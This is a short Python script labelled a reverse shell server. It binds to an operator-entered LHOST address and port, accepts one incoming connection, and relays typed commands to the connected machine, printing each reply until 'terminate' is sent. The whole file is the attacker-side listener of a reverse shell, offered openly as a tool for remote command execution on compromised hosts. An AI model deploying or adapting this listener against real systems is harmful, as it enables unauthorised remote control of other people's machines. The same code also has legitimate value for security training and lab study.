#!/usr/bin/env python3

import socket

def Connect(addr,port):
    #
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    #
    s.bind((addr,port))
    #
    s.listen(1)
    #
    # accept -> returns : connection, ip_address
    #
    print("[*] Listening on: %s:%s " % (addr,port))
    #
    conn, addr = s.accept()
    #
    print("[*] Connection from %s:%s" % (conn,addr))
    #
    while(True):
        #
        command = input(">")
        #
        if('terminate' in command):
            #
            conn.send('terminate'.encode())
            #
            conn.close()
            #
            break
            #
        else:
            #
            conn.send(command.encode())
            #
            print(conn.recv(1024).decode())

def main():#
    #
    print("[*] Reverse Shell Server [*]")
    #
    addr = input("[+] Enter the LHOST IP-> ")
    #
    port = int(input("[+] Enter the LHOST Port-> "))
    #
    print("[*] Starting sever on: %s:%s " % (addr,port))
    #
    Connect(addr,port)

if(__name__ == '__main__'):
    #
    main()
